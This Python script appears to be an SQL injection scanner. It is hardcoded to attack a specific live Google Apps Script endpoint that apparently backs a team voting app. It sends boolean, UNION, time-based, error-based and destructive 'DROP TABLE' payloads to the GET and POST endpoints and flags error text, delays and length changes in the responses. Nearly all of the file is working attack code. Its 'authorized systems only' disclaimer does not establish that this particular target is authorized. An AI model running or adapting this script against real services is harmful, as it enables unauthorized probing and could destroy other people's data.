"""
API Endpoint SQL Injection Tester
Tests the Google Apps Script backend for SQL injection vulnerabilities
Educational purposes only - use only on authorized systems
"""

import requests
import time
from colorama import init, Fore, Style

init(autoreset=True)

API_URL = "https://script.google.com/macros/s/AKfycbxbWXLLKTgzI7zdXklbLKuzwd-1rOT7PwabrSwjplo1_2Pvh1VbCIHOsM3LMUkfEkNHzA/exec"

# SQL Injection Payloads for API testing
VOTE_PAYLOADS = {
    "Normal": "S19",
    "Single Quote": "S19'",
    "Double Quote": 'S19"',
    "SQL Comment": "S19--",
    "Boolean True": "S19' OR '1'='1",
    "Boolean False": "S19' AND '1'='2",
    "Union Null": "S19' UNION SELECT NULL--",
    "Stacked Query": "S19'; DROP TABLE votes--",
    "Time Delay (MySQL)": "S19' AND SLEEP(5)--",
    "Time Delay (PostgreSQL)": "S19' AND pg_sleep(5)--",
    "Error Based": "S19' AND 1=CONVERT(int, @@version)--",
    "OR 1=1": "' OR 1=1--",
    "admin'--": "admin'--",
}

GET_PAYLOADS = {
    "Normal": {"action": "getTeams"},
    "Action Injection": {"action": "getTeams' OR '1'='1"},
    "SQL in Action": {"action": "getTeams'; DROP TABLE teams--"},
}

def test_vote_endpoint(payload_name, team_id):
    """Test POST voting endpoint"""
    print(f"{Fore.CYAN}[*] Testing: {payload_name}")
    
    data = {
        "action": "vote",
        "teamId": team_id
    }
    
    try:
        start_time = time.time()
        response = requests.post(
            API_URL,
            data=data,
            timeout=10,
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        elapsed = time.time() - start_time
        
        return {
            "name": payload_name,
            "status": response.status_code,
            "time": elapsed,
            "response": response.text[:500],  # First 500 chars
            "full_response": response.text
        }
    except requests.exceptions.Timeout:
        return {
            "name": payload_name,
            "status": "TIMEOUT",
            "time": 10,
            "response": "Request timed out",
            "full_response": ""
        }
    except Exception as e:
        return {
            "name": payload_name,
            "status": f"ERROR",
            "time": 0,
            "response": str(e),
            "full_response": ""
        }

def test_get_endpoint(payload_name, params):
    """Test GET endpoint"""
    print(f"{Fore.CYAN}[*] Testing: {payload_name}")
    
    try:
        start_time = time.time()
        response = requests.get(API_URL, params=params, timeout=10)
        elapsed = time.time() - start_time
        
        return {
            "name": payload_name,
            "status": response.status_code,
            "time": elapsed,
            "response": response.text[:500],
            "full_response": response.text
        }
    except Exception as e:
        return {
            "name": payload_name,
            "status": "ERROR",
            "time": 0,
            "response": str(e),
            "full_response": ""
        }

def analyze_response(result, baseline=None):
    """Analyze response for SQL injection indicators"""
    anomalies = []
    
    response_lower = result['response'].lower()
    
    # Check for common error messages
    error_keywords = [
        'sql', 'mysql', 'postgresql', 'sqlite', 'oracle', 'syntax', 
        'error', 'exception', 'warning', 'invalid', 'unexpected',
        'database', 'query', 'statement', 'column', 'table'
    ]
    
    found_errors = [kw for kw in error_keywords if kw in response_lower]
    if found_errors:
        anomalies.append(f"Error keywords: {', '.join(found_errors)}")
    
    # Check for timeout (blind SQL injection indicator)
    if result['status'] == 'TIMEOUT':
        anomalies.append("TIMEOUT - Possible time-based blind SQLi")
    
    # Check for time delay
    if baseline and result['time'] > baseline['time'] + 4:
        anomalies.append(f"Time delay detected: +{result['time'] - baseline['time']:.2f}s")
    
    # Check response length difference
    if baseline and abs(len(result['response']) - len(baseline['response'])) > 50:
        diff = len(result['response']) - len(baseline['response'])
        anomalies.append(f"Length difference: {diff:+d} chars")
    
    # Check for Google Sheets errors (common backend)
    sheets_errors = ['sheets', 'spreadsheet', 'range', 'sheet not found']
    if any(err in response_lower for err in sheets_errors):
        anomalies.append("Google Sheets error detected")
    
    return anomalies

def main():
    print(f"{Fore.CYAN}{'='*80}")
    print(f"{Fore.CYAN}API ENDPOINT SQL INJECTION TESTER")
    print(f"{Fore.CYAN}{'='*80}\n")
    print(f"{Fore.YELLOW}⚠ WARNING: Only use on systems you are authorized to test!")
    print(f"{Fore.YELLOW}⚠ This tests the backend API, not just the frontend.\n")
    
    print(f"Target API: {API_URL}\n")
    
    input(f"{Fore.CYAN}Press Enter to start testing...\n")
    
    # Test 1: GET Endpoint
    print(f"\n{Fore.GREEN}{'='*80}")
    print(f"{Fore.GREEN}TEST 1: GET Endpoint (getTeams)")
    print(f"{Fore.GREEN}{'='*80}\n")
    
    get_results = []
    baseline_get = None
    
    for name, params in GET_PAYLOADS.items():
        result = test_get_endpoint(name, params)
        get_results.append(result)
        
        if name == "Normal":
            baseline_get = result
        
        time.sleep(0.5)
    
    # Analyze GET results
    print(f"\n{Fore.CYAN}GET Endpoint Results:\n")
    for result in get_results:
        anomalies = analyze_response(result, baseline_get)
        
        if anomalies:
            print(f"{Fore.RED}[!] {result['name']}")
        else:
            print(f"{Fore.GREEN}[✓] {result['name']}")
        
        print(f"    Status: {result['status']} | Time: {result['time']:.3f}s")
        print(f"    Response: {result['response'][:100]}...")
        
        if anomalies:
            for anomaly in anomalies:
                print(f"    {Fore.YELLOW}⚠ {anomaly}")
        print()
    
    # Test 2: POST Voting Endpoint
    print(f"\n{Fore.GREEN}{'='*80}")
    print(f"{Fore.GREEN}TEST 2: POST Endpoint (vote)")
    print(f"{Fore.GREEN}{'='*80}\n")
    
    vote_results = []
    baseline_vote = None
    
    for name, team_id in VOTE_PAYLOADS.items():
        result = test_vote_endpoint(name, team_id)
        vote_results.append(result)
        
        if name == "Normal":
            baseline_vote = result
        
        time.sleep(0.5)
    
    # Analyze POST results
    print(f"\n{Fore.CYAN}POST Endpoint Results:\n")
    findings = []
    
    for result in vote_results:
        anomalies = analyze_response(result, baseline_vote)
        
        if anomalies:
            print(f"{Fore.RED}[!] {result['name']}")
            findings.append((result['name'], anomalies, result))
        else:
            print(f"{Fore.GREEN}[✓] {result['name']}")
        
        print(f"    Status: {result['status']} | Time: {result['time']:.3f}s")
        print(f"    Response: {result['response'][:100]}...")
        
        if anomalies:
            for anomaly in anomalies:
                print(f"    {Fore.YELLOW}⚠ {anomaly}")
        print()
    
    # Final Summary
    print(f"\n{Fore.CYAN}{'='*80}")
    print(f"{Fore.CYAN}SUMMARY")
    print(f"{Fore.CYAN}{'='*80}\n")
    
    if findings:
        print(f"{Fore.RED}[!] {len(findings)} potential vulnerabilities detected:\n")
        for name, anomalies, result in findings:
            print(f"{Fore.YELLOW}  • {name}")
            for anomaly in anomalies:
                print(f"    - {anomaly}")
            
            # Show interesting parts of response
            if 'error' in result['response'].lower() or 'exception' in result['response'].lower():
                print(f"{Fore.RED}    Full Response:")
                print(f"    {result['full_response'][:300]}")
            print()
    else:
        print(f"{Fore.GREEN}[✓] No obvious SQL injection vulnerabilities detected")
        print(f"{Fore.YELLOW}Note: The backend might be using Google Sheets (not SQL)")
        print(f"{Fore.YELLOW}or proper parameterized queries.\n")
    
    print(f"{Fore.CYAN}Testing complete!")

if __name__ == "__main__":
    main()
